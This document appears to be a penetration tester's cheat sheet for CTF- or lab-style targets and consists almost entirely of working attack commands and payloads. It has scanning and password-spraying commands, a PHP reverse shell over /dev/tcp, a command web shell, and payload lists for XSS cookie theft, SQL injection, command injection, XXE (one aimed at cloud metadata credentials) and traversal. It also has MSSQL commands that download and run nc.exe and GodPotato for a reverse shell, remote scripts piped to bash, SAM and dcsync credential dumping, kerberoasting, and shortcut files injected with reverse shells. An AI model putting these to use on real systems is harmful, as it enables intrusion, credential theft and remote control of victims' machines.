# Discovery
## New Project
mkdir -p ~/Projects/"$TARGET"; cd ~/Projects/"$TARGET"

## External
(sudo nmap -Pn -n -sS "$TARGET" -g53 --min-rate 500 --max-rate 1500 -oA 'TCP_1000_$TARGET' &)
(sudo nmap -Pn -n -sU "$TARGET" -g53 --min-rate 500 --max-rate 1500 -oA 'UDP_1000_$TARGET' &)
(sudo nmap -Pn -n -sS "$TARGET" -p- -g53 --min-rate 500 --max-rate 1500 -oA 'TCP_ALL_$TARGET' &)
(sudo nmap -Pn -n -sU "$TARGET" -p- -g53 --min-rate 500 --max-rate 1500 -oA 'UDP_ALL_$TARGET' &)

## Internal
cat /etc/NetworkManager/system-connections/Wired\ connection\ 2.nmconnection 
uuid=e06de7a8-e79d-3cce-8063-fcaba7c7d6d0
ip route
sudo nmcli con modify e06de7a8-e79d-3cce-8063-fcaba7c7d6d0 ipv4.addresses 172.16.1.201/24
sudo nmcli con modify e06de7a8-e79d-3cce-8063-fcaba7c7d6d0 ipv4.gateway 172.16.1.1
sudo nmcli con modify e06de7a8-e79d-3cce-8063-fcaba7c7d6d0 ipv4.dns "8.8.8.8"
sudo nmcli con modify e06de7a8-e79d-3cce-8063-fcaba7c7d6d0 ipv4.method manual
sudo systemctl restart NetworkManager.service
sudo systemctl restart networking.service 
nbtscan 10.129.121.0/24
nbtscan-unixwiz 10.129.121.0/24 -m -n -w 0 | sort -k2
netdiscover
ipcalc 172.16.1.73/24     Netmask:   255.255.255.0 = 24
(sudo nmap -Pn -n -sS "$TARGET" -g53 --min-rate 500 --max-rate 1500 -oA 'TCP_1000_$TARGET' &)
(sudo nmap -Pn -n -sU "$TARGET" -g53 --min-rate 500 --max-rate 1500 -oA 'UDP_1000_$TARGET' &)
(sudo nmap -Pn -n -sS "$TARGET" -p- -g53 --min-rate 500 --max-rate 1500 -oA 'TCP_ALL_$TARGET' &)
(sudo nmap -Pn -n -sS "$TARGET" -p- -g53 --min-rate 500 --max-rate 1500 -oA 'TCP_ALL_$TARGET' &)

# Information Gathering
## enum4linux
(enum4linux $TARGET -u '$USERNAME' -p '$PASSWORD' -A > enum4linux_$TARGET &)
cat usernames | sed -n 's/.*\\//p' | cut -d ' ' -f 1

## nmap
PORTS=$(cat *_$TARGET.nmap | cut -d '/' -f 1 | sort -u | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//')
(sudo nmap -Pn -n -sC "$TARGET" -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'SCRIPTS_$TARGET' &)
(sudo nmap -Pn -n -A --script=vulners "$TARGET" -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VULNERS_$TARGET' &)
cat *1000*.nmap
cat *ALL*.nmap
find . -name '*.nmap' -readable -exec echo {} \; -exec cat {} \;

## hosts
echo "$TARGET $DOM $DC" | sudo tee -a /etc/hosts

## spraying
hydra -L usernames -P passwords ftp://$TARGET -t35
hydra -L usernames -P passwords ssh://$TARGET -t35
hydra -L usernames -P passwords smb://$TARGET -t35
hydra -L usernames -P passwords rdp://$TARGET -t35
hydra -L usernames -P passwords snmp://$TARGET -t35
hydra -L usernames -P passwords rlogin://$TARGET -t35
hydra -L usernames -P passwords telnet://$TARGET -t35
hydra -L usernames -P passwords vnc://$TARGET -t35

## Web
[*] Technology
whatweb http://$TARGET

[*] WAF
wafw00f http://$TARGET

[*] Subdomain
gobuster vhost --append-domain -u $DOM -k -r -t200 -q --exclude-length 282 \
-w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
| grep -oP '(?<=Found: )[^ ]+'

[*] Directory
ffuf -u http://"$TARGET"/FUZZ -t 800 -rate 20000 \
-e txt,pdf,conf,config,cnf,html,php,asp,aspx,js \
-v -recursion -recursion-depth 2 \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
2>/dev/null | grep -oP '(http.*)(?<!/)$'

feroxbuster -u http://$TARGET \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-d 4 -k -C 404 \
-x pdf txt bak backup conf config cnf php asp aspx js \
--dont-scan '(?i)(vendor|img|.*(min|gif|css|images|png|jpg)$)'

[*] Traversal
ffuf -u 'http://$TARGET/nav.php?page=FUZZ' -t 400 -rate 10000 -v -mc 200 \
-w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
2>/dev/null | grep -oP '(http.*)(?<!/)$'

[*] WordPress
wpscan --url http://$TARGET/wordpress --enumerate
Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/

## Infrastructure
[*] (21) FTP
nxc ftp "$TARGET" --port 21 -u '$USERNAME' -p '$PASSWORD' --ls
ftp '$USERNAME'@"$TARGET"
anonymous
ls -a
binary
ascii
get file.txt -

[*] (23) Telnet
telnet --user $USERNAME $TARGET

[*] (79) Finger
finger '$USERNAME'@$TARGET
while read -r user; do finger "$user"@$TARGET; done < usernames

[*] (161) SNMP
sudo nmap -sU -p161 --script "snmp* and not snmp-brute" $TARGET
snmpwalk -v1 -c public $TARGET | grep 'STRING:'

[*] (389) LDAP
(nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET' &)
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M get-desc-users
ldapsearch -H ldap://"$TARGET" -x -s base namingcontexts
ldapsearch -H ldap://"$TARGET" -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)"
ldapsearch -H ldap://"$TARGET" -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" | grep -oP '(?<=dn: ).*' | grep -oP '(^[^@]+)'
ldapsearch -H ldap://"$TARGET" -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" | grep -oP '(?<=userPrincipalName: ).*' | grep -oP '(^[^@]+)'
ldapsearch -H ldap://"$TARGET" -x -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" | grep -oP '(?<=description: ).*'
ldapsearch -H ldap://$DC/ -D "$DOM\$USERNAME" -w '$PASSWORD' -b "" -s base "(objectClass=*)" | grep -v 'supported'
ldapsearch -H ldap://$DC/ -D "$DOM\$USERNAME" -w '$PASSWORD' -b "DC=xxxxxx,DC=xxx" "(objectClass=*)" "*" | grep 'SAM' -B 4 -A 3

[*] (445) SMB
nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))'
impacket-samrdump "$TARGET"

[*] MySQL
mysql -h "$TARGET" -u root@localhost -e 'show databases;'

[*] (2049) NFS
showmount -e $TARGET
for x in $(showmount -e "$TARGET" | awk '{print $1}' | grep -v 'Export')
    do mkdir -p "/dev/shm"/mnt"$x"
    sudo mount -t nfs "$TARGET":"$x" "/dev/shm"/mnt"$x" -o nolock
    tree -puga "/dev/shm"/mnt"$x"
done
sudo adduser -u 1002 mntuser
sudo usermod -u 1003 mntuser
sudo su mntuser
setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR

[*] bloodhound
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
impacket-GetADComputers retro.vl/ -dc-ip 10.10.117.117 -k -no-pass
bloodhound-python -c all -u '$USERNAME' -p '$PASSWORD' -d "$DOM" -dc "$DC" -ns "$TARGET"
bloodhound-python -c default -u '$USERNAME' -p '$PASSWORD' -d "$DOM" -dc "$DC" -ns "$TARGET"

# Exploitation
## Reverse Shell Listeners
rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set SRVHOST $MYIP; run"
rlwrap msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 4444; run"
rlwrap msfconsole -q -x "use multi/handler; set LHOST $MYIP; set LPORT 4444; run"
nc -lvnp 4444

## Web
[*] Reverse Shell
<?php
    $lhost = "$MYIP";
    $lport = 4444;
    
    exec("bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'");
    $sock = fsockopen($lhost, $lport);
    if ($sock) {
        exec("sh <&3 >&3 2>&3");
        }
?>
msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=4444 -f raw > msfshell.php

[*] Web Shell
<html>
<body style="background: black;color: whitesmoke;font-family: 'Fira Code', 'Consolas', 'Liberation Mono', 'Courier New', monospace;font-size: 15px;margin: 10px 0 0 18px;">
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input id="cmd" type="TEXT" name="cmd" autofocus size="80" value="<?php echo isset($_GET['cmd']) ? htmlentities($_GET['cmd']) : ''; ?>" style="outline: none; background: inherit;border: none;font-size: 16px;color: inherit;font-family: inherit;font-weight: 800;">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {system($_GET['cmd'] . ' 2>&1');}
?>
</pre>
<script>
    var cmdElement = document.getElementById('cmd');
    cmdElement.focus();
    cmdElement.setSelectionRange(cmdElement.value.length, cmdElement.value.length);
</script>
</body>
</html>

[*] File Upload
curl --upload-file shell.php http://$TARGET:80/upload/
shell.PhP
shell.phar
shell.P.phpHP
shell%2EPHP
shell%2Ephar%00%2Epng
shell%2Ephar%00.png

[*] Traversal
..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
GET /image?filename=/var/www/images/../../../etc/passwd
GET /image?filename=../../../etc/passwd%00.png

[*] XSS
<img src=x>'"${{7*7}}
<svgonload=alert(document.cookie)>
<svg/onload=alert(document.cookie)>
"onmouseover="alert(document.cookie)
javascript:alert(document.cookie)
?returnPath=javascript:alert(document.cookie)
<iframe src="https://vulnerable.site/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
{{$on.constructor('alert(document.cookie)')()}}
\"-alert(document.cookie)}//
<<<>>><img src="x"/onerror=alert(document.cookie)>
</><TAG/EVENT="">
<iframe src="https://$TARGET/?search=%22%3E%3Cbody%20onresize%3Dalert%28document%2Ecookie%29%3E" onload=this.style.width='0px'>

[*] HTTP Methods
GET
HEAD
POST
PUT
DELETE
CONNECT
OPTIONS
TRACE
PATCH

[*] Headers
X-Forwarded-For: 1

[*] sqlmap
sqlmap -r request --batch --level 3 -dbs
sqlmap -r request --batch --level 3 -D temp_db --tables
sqlmap -r request --batch --level 3 -D temp_db -T users --columns
sqlmap -r request --batch --level 3 -D temp_db -T users --columns --dump

[*] SQLi
' OR 1=1 -- #
OR 1=1 -- #
AND 1=1 -- #
' AND 1=1 -- #
administrator'-- #
' ORDER BY 1 -- #
' UNION SELECT table_name,NULL FROM information_schema.tables -- #
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_efwvmk' -- #
' UNION SELECT username_aakuyh,password_wrukls FROM users_efwvmk -- #
' AND 1=(SELECT 1 FROM users LIMIT 1) -- #
' AND 1=(SELECT 1 FROM users WHERE username='administrator') -- #
' AND 1=(SELECT 1 FROM users WHERE username='administrator' AND LENGTH(password)=20) -- #
' AND '$x$'=(SELECT SUBSTR(password,$1$,1) FROM users WHERE username='administrator') -- #
"AND"1"="1
year=2005 ORDER BY 4
username=admin', 'password', true, '2025-02-03 15:14:29.253', 2133415744)-- #&password1=admin&password2=admin	# INSERT INTO sqlinjection004_users (username, password, isAdmin, lastLogin, lastIP)
username=target';-- # &password1=test&password2=test 

[*] Command Injection
;id #
;sleep+10;
;sleep+10;cat+/etc/passwd+>+/var/www/images/test.txt;
;cat /etc/passwd
;echo 'L2V0Yy9wYXNzd2Q=' | base64 -d | xargs cat
;cat "$(echo 'L2V0Yy9wYXNzd2Q=' | base64 -d)"
;ls -la "$(echo 'Li4vLi4vLi4vCg==' | base64 -d)"
;ls -laR "$(echo 'Li4vLi4vLi4vLi4vLi4vCg==' | base64 -d)"
logname=;cat /etc/passwd > log.txt
&amp;id

[*] XXE
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>

productId=<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text" />

Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?><x>x</x>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

[*] JWT
git clone https://github.com/wallarm/jwt-secrets.git ~/.git/jwt_secrets

hashcat -a 0 -m 16500 <JWT> ~/.git/jwt_secrets/jwt.secrets.list

[*] GraphQL
Content-Type: application/json

{  "query":"{\n\n__schema\n\n{queryType{name}}"  }

{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}

{"query":"{\u000A\n\r\t__schema\u000A\n\r\t{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}

/api?query=query+IntrospectionQuery+%7B%0A++%0A%0A%0A%0A%5f%5fschema%0A%0A%0A%0A+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A

nano gql; gqlspection -f gql

https://datafetcher.com/graphql-json-body-converter

{  "query": "query { getUser(id: 3) { id username }}"  }

{  "query": "mutation { deleteOrganizationUser(input: {id:3}) { user { id username } }}"  }

[*] Git
git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git

## Infrastructure
[*] (22) SSH
ssh-keygen -f sshkey -N ''; cat sshkey.pub
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINzZbkLBUl5mk0AW8lPkWRXrupSiydDr8GJauiEAu3Ze' > $TARGET ~/.ssh/authorized_keys
ssh-add -D
$USERNAME@$TARGET -i sshkey.pub
nano id_rsa; chmod 600 id_rsa; $USERNAME@$TARGET -i id_rsa -o PubkeyAcceptedAlgorithms=ssh-rsa

[*] (88) Kerberos
sudo apt install -y heimdal-clients libsasl2-modules-gssapi-heimdal

KRB5_FILE="custom_krb5.conf";export KRB5_CONFIG="$PWD/$KRB5_FILE"; nano ./"$KRB5_FILE"
[libdefaults]
    default_realm = $KRB5DOM
    dns_lookup_realm = true
    dns_lookup_kdc = true

[realms]
    $KRB5DOM = {
        kdc = $DC
        admin_server = $DC
        default_domain = $DC
    }

[domain_realm]
    $DOM = $KRB5DOM
    .$DOM = $KRB5DOM

TGT=$(impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $TGT"; export KRB5CCNAME="$TGT"; chmod 0600 "$TGT"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist

ST='cifs/$DC'; F=$(impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $ST | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $F"; export KRB5CCNAME="$F"; chmod 0600 "$F"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist

impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET -newpass 'Password12345!' -p kpasswd
impacket-changepasswd -dc-ip $TARGET $DOM/ -k -no-pass -p kpasswd
impacket-GetADUsers $DOM/ -dc-ip $TARGET -k -no-pass
impacket-GetADComputers $DOM/ -dc-ip $TARGET -k -no-pass
nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=805306369)" "SAMAccountName" | awk '{print $6}' | grep '\$' > machines | sed 's/.$//' | tr '[:upper:]' '[:lower:]' > machines_pw; nxc smb $TARGET -u machines -p machines_pw | grep -oP '\[-\].*TRUST_ACCOUNT.*' | while read line; do echo -e "\e[1;33m$line <--- CHANGE PASSWORD NOW\!\e[0m"; done
impacket-GetNPUsers $DOM/ -dc-ip $TARGET -usersfile usernames -k -no-pass
impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -usersfile usernames -k -no-pass
impacket-GetUserSPNs $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -request
while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -request-user '$user' -k -no-pass; done < usernames

[*] (445) SMB
msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser $USERNAME; set SMBPass $PASSWORD; set CreateSession true; run"
sessions -i 1
shares -i C$
cd programdata
upload nc.exe

impacket-smbclient $DOM/'$USERNAME':'$PASSWORD'@$TARGET
shares
use

[*] (512-514) RSERVICES
echo '+ +' > .rhosts; chmod 600 .rhosts
rlogin $USERNAME@$TARGET

[*] ADCS
certipy-ad find -u '$USERNAME' -p '$PASSWORD' -dc-ip $TARGET -vulnerable -enabled -stdout
certipy-ad req -target '$DC' -ca '$CA' -upn 'Administrator' -template 'RetroClients' -key-size '4096' -k -no-pass

[*] (3389) RDP
xfreerdp /v:'$TARGET' -sec-nla /tls-seclevel:0 /dynamic-resolution +clipboard
xfreerdp /u:'$USERNAME' /p:'$PASSWORD' /v:'$TARGET' /tls-seclevel:0 /dynamic-resolution +clipboard

[*] (5985) WINRM
evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'

[*] MSSQL
netexec mssql $TARGET -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X 'certutil -urlcache -f http://$MYIP:8088/runascs.exe C:\programdata\runascs.exe;certutil -urlcache -f http://$MYIP:8088/nc.exe C:\programdata\nc.exe; certutil -urlcache -f http://$MYIP:8088/GodPotato-NET4.exe C:\programdata\GodPotato-NET4.exe; C:\programdata\runascs.exe sql_svc WqSZAF6CysDQbGb3 --logon-type 5 -b "C:\programdata\GodPotato-NET4.exe -cmd \"cmd /c C:\programdata\nc.exe -e cmd.exe $MYIP 4444\""'

netexec mssql $TARGET -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X 'certutil -urlcache -f http://$MYIP:8088/runascs.exe C:\programdata\runascs.exe;certutil -urlcache -f http://$MYIP:8088/nc.exe C:\programdata\nc.exe; certutil -urlcache -f http://$MYIP:8088/GodPotato-NET4.exe C:\programdata\GodPotato-NET4.exe; C:\programdata\runascs.exe sql_svc WqSZAF6CysDQbGb3 --logon-type 5 -b "cmd /c mshta.exe http://$MYIP:8080/cf9J5o.hta"'
sessions -i 1 -c 'C:\programdata\GodPotato-NET4.exe -cmd "cmd /c whoami /priv"'
sessions -i 1 -C 'getsystem'
sessions -i 1

# Post-Exploitation 
## Fileserver
python3 -m http.server 80 -d ~/Downloads/upload
wget -qO- 192.168.214.128/linux/linpeas.sh | bash
curl 192.168.214.128/linux/linpeas.sh | bash

## Linux
[*] Enumeration
find / -name '*secret0*' -readable 2>/dev/null | xargs ls -la
find / -name 'root.txt' -readable -exec echo {} \; -exec cat {} \; 2>/dev/null
cat /etc/passwd | grep -vE 'nologin' | cut -d ':' -f '1'
sudo -l
find / -perm /4000 2>/dev/null
cat /etc/crontab
netstat -tuln
ls -la /opt
grep -r -E 'conf' /var/www
cat ~/.ssh/id_rsa
cat /etc/shadow
curl $MYIP:8088/linpeas.sh | bash
su $USERNAME --preserve-environment
ssh $USERNAME@$TARGET -i sshkey.pub -L 33060:Localhost:33060 -L 5000:Localhost:5000

[*] Upgrade TTY
python3 -c 'import pty; pty.spawn("/bin/bash")';
CTRL-Z
stty size;stty raw -echo;fg
export SHELL=bash;
export TERM=xterm-256color;
stty rows <num> columns <num>
reset

[*] 

## Windows
[*] MSHTA
msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set SRVHOST $MYIP; run"
mshta.exe http://$MYIP:8080/nZzLAD.hta
sessions -i 1

[*] Metasploit
getuid
getprivs
sysinfo
execute -H -i -f powershell.exe -a "-Command Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
arp
ipconfig
load exploit
load kiwi
load priv
run exploit/windows/local/unquoted_service_path LHOST=eth1
run post/windows/gather/enum_domain
run post/windows/gather/enum_domains
run post/windows/gather/enum_unattend
run post/windows/gather/credentials/enum_cred_store
run post/windows/gather/credentials/gpp
run post/windows/gather/credentials/windows_autologin
hashdump
kiwi_cmd "lsadump::dcsync /domain:SATURN.local /all /csv"
getsystem
cp /root/Tools/Inf/privilege-escalation-awesome-scripts-suite/metasploit/peass.rb /usr/share/metasploit-framework/modules/post/multi/gather/
reload_all
background
sessions
sessions -i 1

[*] Enumeration
powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
cd C:\ & dir /S /B SAM == SYSTEM == SAM.* == SYSTEM.*
icacls C:\Windows\System32\Config
whoami /priv
cd C:\users; tree /f
wmic useraccount get name,sid
powershell -c "Set-ExecutionPolicy unrestricted"

[*] SeBackupPrivilege
robocopy /b \Users\Administrator\Desktop .

[*] File Transfer
python3 -m http.server -d Downloads/upload/windows 8088
powershell -c "certutil -urlcache -f http://$MYIP:8088/winpeas.exe C:\programdata\winpeas.exe"
powershell -c "certutil -urlcache -f http://$MYIP:8088/nc.exe C:\programdata\nc.exe"

[*] SAM
nxc winrm $TARGET -u '$USERNAME' -p '$PASSWORD' --sam --dump-method powershell

cd c:\programdata; reg save hklm\sam SAM; reg save hklm\system SYSTEM;
download SAM
download SYSTEM
impacket-secretsdump LOCAL -sam SAM -system SYSTEM
echo 'Administrator:500:...................' > hashes
hashcat -m 1000 -a 0 hashes /usr/share/wordlists/rockyou.txt

[*] Rubeus
Rubeus.exe kerberoast
nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=/usr/share/wordlists/rockyou.txt --format=krb5tgs
Rubeus.exe asreproast
nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=/usr/share/wordlists/rockyou.txt --format=krb5asrep

[*] url / .lnk exploits
click.url
[InternetShortcut]
URL=C:\programdata\shell.bat

[Notepad.lnk - Inject Reverse Shell]
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\Common Applications\Notepad.lnk');$s.TargetPath='C:\Windows\System32\cmd.exe';$s.Arguments='/c \"C:\ProgramData\nc.exe $MYIP 4444 -e cmd\"';$s.Save()"

[*] Powerview
powershell -c "certutil -urlcache -f http://$MYIP:8088/powerview.ps1 C:\programdata\powerview.ps1"
powershell Import-Module C:\programdata\powerview.ps1
Get-NetDomain
Get-LocalUser
Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET

# Lateral Movement
## Linux
## Windows
[*] Metasploit
run post/multi/manage/autoroute
run post/multi/manage/autoroute ACTION=delete
run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24
use exploit/windows/smb/psexec
set LHOST 10.10.10.3
set RHOSTS 10.10.10.1-2
set SMBUser Administrator
set SMBPass be77c30f5bb90694f6fd9e48f380c9c3:6aa6bca0dafa60871fa5ecaf2217e05f
run
